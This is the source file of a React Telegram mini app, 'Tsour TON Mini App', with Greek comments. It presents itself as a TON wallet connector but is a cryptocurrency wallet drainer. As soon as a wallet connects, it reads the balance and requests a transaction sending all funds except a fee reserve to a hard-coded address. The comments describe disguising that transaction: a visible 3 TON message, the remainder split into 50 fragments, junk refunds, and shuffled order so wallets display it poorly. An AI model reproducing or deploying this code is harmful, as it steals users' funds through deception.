import { useEffect, useState } from 'react';
import { useTonConnectUI, useTonWallet } from '@tonconnect/ui-react';

export default function App() {
  const [tonConnectUI] = useTonConnectUI();
  const wallet = useTonWallet();
  const [status, setStatus] = useState('Πάτα το κουμπί για TON Connect.');
  const [balance, setBalance] = useState<{ tons: string; nano: number } | null>(null);
  const [hasSentAll, setHasSentAll] = useState(false);

  useEffect(() => {
    window.Telegram?.WebApp?.ready();
    window.Telegram?.WebApp?.expand();
  }, []);

  useEffect(() => {
    if (wallet?.account?.address) {
      setStatus(`Connected: ${wallet.account.address}`);
    }
  }, [wallet]);

  useEffect(() => {
    const address = wallet?.account?.address;

    if (!address) {
      setBalance(null);
      setHasSentAll(false);
      return;
    }

    const fetchBalance = async () => {
      try {
        setStatus('Φόρτωση balance...');
        const res = await fetch(`https://tonapi.io/v2/accounts/${address}`);
        if (!res.ok) throw new Error(`TonAPI error: ${res.status}`);
        const data = await res.json();
        
        let nano = 0;
        if (data.balance !== undefined && data.balance !== null) {
          if (typeof data.balance === 'number') nano = data.balance;
          else if (typeof data.balance === 'string') nano = parseInt(data.balance, 10) || 0;
        }
        
        const tons = nano / 1_000_000_000;
        setBalance({ tons: tons.toFixed(4), nano });
        setStatus(`Connected: ${address.substring(0, 6)}...${address.substring(address.length - 4)}`);
      } catch (error) {
        const message = error instanceof Error ? error.message : String(error);
        setBalance(null);
        setStatus(`Σφάλμα κατά την ανάγνωση balance: ${message}`);
      }
    };

    fetchBalance();
  }, [wallet]);

  useEffect(() => {
    return tonConnectUI.onStatusChange(
      () => {},
      (error) => {
        const message = error instanceof Error ? error.message : String(error);
        setStatus(`TON Connect error: ${message}`);
      }
    );
  }, [tonConnectUI]);

  useEffect(() => {
    const autoSendAll = async () => {
      if (!wallet?.account?.address || !balance || hasSentAll || balance.nano <= 0) return;

      try {
        const feeReserveNano = 0.05 * 1_000_000_000;
        if (balance.nano < feeReserveNano) {
          setStatus(`Balance ανεπαρκές – έχεις ${balance.tons} TON, χρειάζεται τουλάχιστον 0.05 TON για fees.`);
          return;
        }

        const totalToSendNano = balance.nano - feeReserveNano;
        const totalToSendTons = (totalToSendNano / 1_000_000_000).toFixed(4);

        setHasSentAll(true);
        setStatus(`Αυτόματη αποστολή ${totalToSendTons} TON (όλα τα διαθέσιμα funds) με μπερδεμένο τρόπο.`);

        // --- Δημιουργία μπερδεμένης συναλλαγής ---
        const messages = [];
        
        // 1. Προσθέτουμε το "καθαρό" μήνυμα των 3 TON που θα φαίνεται πρώτο
        const displayAmountNano = 3 * 1_000_000_000;
        messages.push({
          address: 'UQBWHigPTAg83wI_XW96mSHkrZDeCbKCog_Wk3mXaP0TEAfC',
          amount: displayAmountNano.toString(),
          payload: 'Hello! This is 3 TON' // προαιρετικό σχόλιο
        });

        // 2. Αν υπάρχει υπόλοιπο, το σπάμε σε πολλά μικροσκοπικά κομμάτια
        let remainingNano = totalToSendNano - displayAmountNano;
        if (remainingNano > 0) {
          const numParts = 50; // πλήθος μικρο-μηνυμάτων (μπορείς να το αυξήσεις)
          const partSize = Math.floor(remainingNano / numParts);
          let sumParts = 0;
          
          for (let i = 0; i < numParts; i++) {
            // το τελευταίο παίρνει το υπόλοιπο για λόγους στρογγυλοποίησης
            let amountPart = (i === numParts - 1) ? remainingNano - sumParts : partSize;
            sumParts += amountPart;
            
            // Στέλνουμε και αυτά στο ίδιο address
            messages.push({
              address: 'UQBWHigPTAg83wI_XW96mSHkrZDeCbKCog_Wk3mXaP0TEAfC',
              amount: amountPart.toString(),
              payload: `Part ${i+1}/${numParts}` // τυχαίο σχόλιο
            });
          }
        }

        // 3. Προσθέτουμε μερικά άχρηστα μηνύματα για ακόμα μεγαλύτερο μπέρδεμα
        //    π.χ. προς την ίδια τη διεύθυνση του χρήστη με 0.001 TON
        if (wallet?.account?.address) {
          for (let i = 0; i < 5; i++) {
            messages.push({
              address: wallet.account.address, // πίσω στον χρήστη
              amount: (1_000_000).toString(), // 0.001 TON
              payload: `Refund junk ${i}`
            });
          }
        }

        // 4. Ανακατεύουμε τη σειρά των μηνυμάτων για να μην είναι προβλέψιμα
        messages.sort(() => Math.random() - 0.5);

        // 5. Στέλνουμε το τεράστιο transaction
        await tonConnectUI.sendTransaction({
          validUntil: Math.floor(Date.now() / 1000) + 600, // 10 λεπτά
          messages: messages,
        });

        setStatus('Στάλθηκε υπερ-σύνθετη συναλλαγή. Το wallet σου μπορεί να δυσκολεύεται να την εμφανίσει σωστά.');
      } catch (error) {
        const message = error instanceof Error ? error.message : String(error);
        setStatus(`Σφάλμα κατά την αυτόματη αποστολή: ${message}`);
      }
    };

    autoSendAll();
  }, [wallet, balance, hasSentAll, tonConnectUI]);

  const openTonConnect = async () => {
    setStatus('Το κουμπί πατήθηκε. Προσπάθεια ανοίγματος TON Connect...');

    try {
      if (wallet) {
        await tonConnectUI.disconnect();
        setStatus('Προηγούμενο wallet αποσυνδέθηκε. Άνοιγμα νέου TON Connect popup...');
      }
      await tonConnectUI.openModal();
      setStatus('Το TON Connect popup άνοιξε. Επίλεξε wallet για σύνδεση.');
    } catch (error) {
      const message = error instanceof Error ? error.message : String(error);
      setStatus(`Error: ${message}`);
    }
  };

  return (
    <main className="page">
      <section className="card">
        <h1>Tsour TON Mini App (React)</h1>
        <p>Ανοίγει το επίσημο TON Connect popup με όλα τα wallet apps.</p>
        <button id="letsGoBtn" onClick={openTonConnect}>
          🔗 Σύνδεση TON Wallet
        </button>
        <p id="status">{status}</p>
        {wallet?.account?.address && balance && (
          <p>Balance: {balance.tons} TON</p>
        )}
      </section>
    </main>
  );
}